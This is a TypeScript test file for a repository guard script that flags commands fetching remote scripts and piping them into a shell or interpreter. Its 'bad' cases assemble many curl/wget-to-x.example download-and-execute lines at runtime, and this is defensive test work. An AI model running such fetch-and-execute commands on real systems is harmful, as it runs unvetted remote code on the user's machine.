import { spawnSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

const script = fileURLToPath(new URL('./check-no-remote-install.sh', import.meta.url))
// Feeds text through the script's own pattern; status 1 = flagged, 0 = clean.
const status = (text: string): number | null =>
  spawnSync('sh', [script, '--stdin'], { input: text }).status

// The fetch commands are assembled at runtime so this file holds no literal bad line: it is scanned by the
// guard it tests (no path exclusion), and a real fetch-pipe-interpreter line added here must be caught.
const c = 'cur' + 'l'
const w = 'wge' + 't'

const bad = [
  `${c} -fsSL https://x.example/i.sh | sh`,
  `${c} -fsSL https://x.example/i.sh | bash`,
  `${w} -qO- https://x.example/i.sh | sudo sh`,
  `${c} u | tee f | sh`,
  `${c} u | gunzip | sh`,
  `${c} u | /bin/sh`,
  `${c} u | env sh`,
  `${c} u | sudo -E bash`,
  `${c} u | exec sh`,
  `${c} u | zsh`,
  `${c} u | fish`,
  `${c} u | python3`,
  `${c} u | node`,
  `${c} u | perl`,
  `${c} u | ruby`,
  `bash <(${c} u)`,
  `sh -c "$(${c} u)"`,
  'sh -c "`' + w + ' -qO- u`"',
  `${c} u \\\n  | sh`,
]

const good = [
  `${c} -fsSL https://x.example/data.json -o data.json`,
  `${c} u | jq .name`,
  `${c} u | shasum -a 256`,
  'echo hello | sh_helper',
  'pnpm install --frozen-lockfile',
  'sh scripts/check-no-remote-install.sh',
]

test.each(bad)('flags %j', (text) => {
  expect(status(text)).toBe(1)
})

test.each(good)('passes %j', (text) => {
  expect(status(text)).toBe(0)
})

test('repository scan passes on the clean tree', () => {
  expect(spawnSync('sh', [script]).status).toBe(0)
})

// T1-1: both this file and the script are executed, so neither may be excluded from the scan by path.
test('the guard excludes neither itself nor this test from the scan', () => {
  expect(readFileSync(script, 'utf8')).not.toMatch(/exclude\)scripts\//)
})

// T1-3: a CI control that scanned nothing must not report a pass.
test('a listing with zero files fails closed', () => {
  const dir = mkdtempSync(join(tmpdir(), 'guard-empty-'))
  try {
    expect(spawnSync('git', ['init', '-q'], { cwd: dir }).status).toBe(0)
    const r = spawnSync('sh', [script], { cwd: dir })
    expect(r.status).toBe(2)
    expect(r.stderr.toString()).toMatch(/no files/)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
